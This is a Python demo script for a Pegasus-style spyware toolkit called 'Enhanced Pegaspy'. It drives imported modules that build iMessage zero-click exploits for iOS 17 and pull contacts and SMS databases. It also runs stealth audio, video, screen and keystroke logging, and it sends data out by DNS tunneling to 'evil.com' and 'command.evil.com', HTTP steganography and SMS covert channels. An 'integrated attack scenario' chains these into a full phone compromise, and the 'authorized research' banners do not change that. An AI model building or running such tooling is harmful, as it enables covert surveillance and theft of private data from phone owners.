#!/usr/bin/env python3
"""
Pegasus Demo Script
Demonstrates the enhanced Pegaspy capabilities for authorized security research

Author: Enhanced Pegaspy Team
Date: 2025
Purpose: Security Research and Testing
"""

import asyncio
import json
import logging
import os
import sys
from datetime import datetime
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

# Import enhanced modules
from exploits.imessage_advanced import AdvancedIMesageExploits, IOSVersion
from data_exfiltration.exfil_engine import DataExfiltrationEngine
from surveillance.realtime_monitor import RealtimeSurveillanceEngine
from testing.pegasus_test_suite import PegasusTestSuite

class PegasusDemo:
    """Comprehensive demonstration of Pegasus-like capabilities"""
    
    def __init__(self):
        self.setup_logging()
        self.logger = logging.getLogger(__name__)
        
        # Initialize components
        self.imessage_exploit = AdvancedIMesageExploits()
        self.exfil_engine = DataExfiltrationEngine()
        self.surveillance = RealtimeSurveillanceEngine()
        self.test_suite = PegasusTestSuite()
        
        self.demo_results = []
    
    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('pegasus_demo.log')
            ]
        )
    
    def print_banner(self):
        """Print demo banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    🔥 PEGASUS DEMO 🔥                       ║
║              Enhanced Pegaspy Capabilities                   ║
║                                                              ║
║  ⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY  ⚠️              ║
║                                                              ║
║  This demonstration showcases advanced capabilities          ║
║  similar to Pegasus spyware for educational and             ║
║  authorized security testing purposes only.                 ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    async def demo_imessage_exploits(self):
        """Demonstrate iMessage exploit capabilities"""
        print("\n🎯 === iMessage Zero-Click Exploits ===")
        
        try:
            # Demo CoreGraphics exploit
            print("\n📱 Testing CoreGraphics Heap Overflow...")
            exploit = self.imessage_exploit.create_coregraphics_exploit(
                target_version=IOSVersion.IOS_17
            )
            result = exploit is not None
            self.demo_results.append({
                "test": "CoreGraphics Exploit",
                "result": result,
                "timestamp": datetime.now().isoformat()
            })
            print(f"   Result: {'✅ Success' if result else '❌ Failed'}")
            
            # Demo ImageIO exploit
            print("\n🖼️  Testing ImageIO Integer Overflow...")
            exploit = self.imessage_exploit.create_imageio_exploit(
                target_version=IOSVersion.IOS_17
            )
            result = exploit is not None
            self.demo_results.append({
                "test": "ImageIO Exploit",
                "result": result,
                "timestamp": datetime.now().isoformat()
            })
            print(f"   Result: {'✅ Success' if result else '❌ Failed'}")
            
            # Demo Notification exploit
            print("\n🔔 Testing Notification Use-After-Free...")
            exploit = self.imessage_exploit.create_notification_exploit(
                target_version=IOSVersion.IOS_17
            )
            result = exploit is not None
            self.demo_results.append({
                "test": "Notification Exploit",
                "result": result,
                "timestamp": datetime.now().isoformat()
            })
            print(f"   Result: {'✅ Success' if result else '❌ Failed'}")
            
        except Exception as e:
            self.logger.error(f"iMessage exploit demo failed: {e}")
            print(f"   ❌ Demo failed: {e}")
    
    async def demo_data_exfiltration(self):
        """Demonstrate data exfiltration capabilities"""
        print("\n📡 === Data Exfiltration Capabilities ===")
        
        try:
            # Demo iOS contacts extraction
            print("\n📱 Extracting iOS Contacts...")
            contacts = await self.exfil_engine.extract_ios_contacts("/fake/path/AddressBook.sqlitedb")
            print(f"   Extracted {len(contacts)} contacts")
            for contact in contacts[:2]:  # Show first 2
                print(f"   - {contact['name']}: {contact['phone']}")
            
            # Demo Android messages extraction
            print("\n📱 Extracting Android Messages...")
            messages = await self.exfil_engine.extract_android_messages("/fake/path/mmssms.db")
            print(f"   Extracted {len(messages)} messages")
            for msg in messages[:2]:  # Show first 2
                print(f"   - From {msg['sender']}: {msg['content'][:30]}...")
            
            # Demo DNS tunneling exfiltration
            print("\n🌐 Testing DNS Tunneling Exfiltration...")
            test_data = b"Sensitive data to exfiltrate via DNS"
            result = await self.exfil_engine.exfiltrate_via_dns(test_data, "evil.com")
            print(f"   DNS Exfiltration: {'✅ Success' if result else '❌ Failed'}")
            
            # Demo HTTP steganography exfiltration
            print("\n🕸️  Testing HTTP Steganography Exfiltration...")
            result = await self.exfil_engine.exfiltrate_via_http_steganography(
                test_data, "https://legitimate-site.com/image.jpg"
            )
            print(f"   HTTP Steganography: {'✅ Success' if result else '❌ Failed'}")
            
            # Demo SMS covert channel
            print("\n📱 Testing SMS Covert Channel...")
            result = await self.exfil_engine.exfiltrate_via_sms_covert(
                test_data, "+1234567890"
            )
            print(f"   SMS Covert Channel: {'✅ Success' if result else '❌ Failed'}")
            
        except Exception as e:
            self.logger.error(f"Data exfiltration demo failed: {e}")
            print(f"   ❌ Demo failed: {e}")
    
    async def demo_surveillance(self):
        """Demonstrate surveillance capabilities"""
        print("\n👁️  === Real-time Surveillance Capabilities ===")
        
        try:
            # Start audio surveillance
            print("\n🎤 Starting Audio Surveillance...")
            audio_session = await self.surveillance.start_audio_recording(
                duration=5,  # 5 seconds for demo
                quality="medium",
                stealth_mode=True
            )
            print(f"   Audio Session: {audio_session}")
            
            # Start video surveillance
            print("\n📹 Starting Video Surveillance...")
            video_session = await self.surveillance.start_video_capture(
                duration=3,  # 3 seconds for demo
                resolution="720p",
                stealth_mode=True
            )
            print(f"   Video Session: {video_session}")
            
            # Start screen capture
            print("\n🖥️  Starting Screen Capture...")
            screen_session = await self.surveillance.start_screen_capture(
                interval=2,  # Every 2 seconds
                duration=6,  # 6 seconds total
                stealth_mode=True
            )
            print(f"   Screen Session: {screen_session}")
            
            # Start keylogger
            print("\n⌨️  Starting Keylogger...")
            keylog_session = await self.surveillance.start_keylogger(
                duration=5,  # 5 seconds for demo
                stealth_mode=True
            )
            print(f"   Keylogger Session: {keylog_session}")
            
            # Wait for surveillance to complete
            print("\n⏳ Surveillance running... (waiting 8 seconds)")
            await asyncio.sleep(8)
            
            # Get surveillance status
            status = self.surveillance.get_surveillance_status()
            print(f"\n📊 Active Sessions: {len(status.get('active_sessions', []))}")
            
        except Exception as e:
            self.logger.error(f"Surveillance demo failed: {e}")
            print(f"   ❌ Demo failed: {e}")
    
    async def demo_integration_scenario(self):
        """Demonstrate integrated attack scenario"""
        print("\n🎭 === Integrated Attack Scenario ===")
        
        try:
            print("\n🎯 Scenario: Complete Mobile Compromise")
            print("   1. Deploy zero-click iMessage exploit")
            print("   2. Establish persistence")
            print("   3. Start surveillance")
            print("   4. Exfiltrate collected data")
            
            # Step 1: Deploy exploit
            print("\n📱 Step 1: Deploying iMessage exploit...")
            exploit = self.imessage_exploit.create_coregraphics_exploit(
                target_version=IOSVersion.IOS_17
            )
            exploit_result = exploit is not None
            print(f"   Exploit deployment: {'✅ Success' if exploit_result else '❌ Failed'}")
            
            if exploit_result:
                # Step 2: Start surveillance
                print("\n👁️  Step 2: Starting comprehensive surveillance...")
                audio_session = await self.surveillance.start_audio_recording(
                    duration=10, quality="high", stealth_mode=True
                )
                screen_session = await self.surveillance.start_screen_capture(
                    interval=3, duration=10, stealth_mode=True
                )
                
                # Step 3: Simulate data collection
                print("\n📊 Step 3: Collecting target data...")
                await asyncio.sleep(3)  # Simulate data collection time
                
                # Step 4: Exfiltrate data
                print("\n📡 Step 4: Exfiltrating collected data...")
                surveillance_data = b"Collected surveillance data from target device"
                exfil_result = await self.exfil_engine.exfiltrate_via_dns(
                    surveillance_data, "command.evil.com"
                )
                print(f"   Data exfiltration: {'✅ Success' if exfil_result else '❌ Failed'}")
                
                print("\n🎉 Integrated scenario completed successfully!")
            else:
                print("\n❌ Scenario aborted due to exploit failure")
                
        except Exception as e:
            self.logger.error(f"Integration scenario failed: {e}")
            print(f"   ❌ Scenario failed: {e}")
    
    async def run_comprehensive_tests(self):
        """Run the comprehensive test suite"""
        print("\n🧪 === Comprehensive Test Suite ===")
        
        try:
            print("\n🔬 Running full Pegasus test suite...")
            await self.test_suite.run_all_tests()
            
            # Get test results
            results = self.test_suite.get_test_results()
            print(f"\n📊 Test Results Summary:")
            print(f"   Total Tests: {results['total_tests']}")
            print(f"   Passed: {results['passed']}")
            print(f"   Failed: {results['failed']}")
            print(f"   Success Rate: {results['success_rate']:.1f}%")
            
        except Exception as e:
            self.logger.error(f"Test suite failed: {e}")
            print(f"   ❌ Test suite failed: {e}")
    
    def save_demo_results(self):
        """Save demo results to file"""
        try:
            results_file = f"pegasus_demo_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            demo_summary = {
                "demo_timestamp": datetime.now().isoformat(),
                "demo_results": self.demo_results,
                "components_tested": [
                    "iMessage Zero-Click Exploits",
                    "Data Exfiltration Engine",
                    "Real-time Surveillance",
                    "Integration Scenarios",
                    "Comprehensive Test Suite"
                ],
                "capabilities_demonstrated": [
                    "CoreGraphics heap overflow exploit",
                    "ImageIO integer overflow exploit",
                    "Notification use-after-free exploit",
                    "iOS contacts extraction",
                    "Android messages extraction",
                    "DNS tunneling exfiltration",
                    "HTTP steganography exfiltration",
                    "SMS covert channel exfiltration",
                    "Audio surveillance",
                    "Video surveillance",
                    "Screen capture",
                    "Keylogging",
                    "Integrated attack scenarios"
                ]
            }
            
            with open(results_file, 'w') as f:
                json.dump(demo_summary, f, indent=2)
            
            print(f"\n💾 Demo results saved to: {results_file}")
            
        except Exception as e:
            self.logger.error(f"Failed to save demo results: {e}")
    
    async def run_demo(self):
        """Run the complete Pegasus demonstration"""
        self.print_banner()
        
        print("\n🚀 Starting Pegasus capabilities demonstration...")
        print("   This demo showcases advanced spyware capabilities")
        print("   for authorized security research and testing.\n")
        
        try:
            # Run all demo components
            await self.demo_imessage_exploits()
            await self.demo_data_exfiltration()
            await self.demo_surveillance()
            await self.demo_integration_scenario()
            await self.run_comprehensive_tests()
            
            # Save results
            self.save_demo_results()
            
            print("\n" + "="*60)
            print("🎉 PEGASUS DEMO COMPLETED SUCCESSFULLY! 🎉")
            print("="*60)
            print("\n📋 Demo Summary:")
            print("   ✅ iMessage zero-click exploits demonstrated")
            print("   ✅ Multi-channel data exfiltration tested")
            print("   ✅ Real-time surveillance capabilities shown")
            print("   ✅ Integrated attack scenarios executed")
            print("   ✅ Comprehensive test suite completed")
            print("\n⚠️  Remember: Use these capabilities responsibly")
            print("   and only for authorized security research!")
            
        except Exception as e:
            self.logger.error(f"Demo failed: {e}")
            print(f"\n❌ Demo failed: {e}")

def main():
    """Main demo function"""
    demo = PegasusDemo()
    
    try:
        # Run the demo
        asyncio.run(demo.run_demo())
    except KeyboardInterrupt:
        print("\n\n⚠️  Demo interrupted by user")
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
        logging.error(f"Demo failed: {e}")

if __name__ == "__main__":
    main()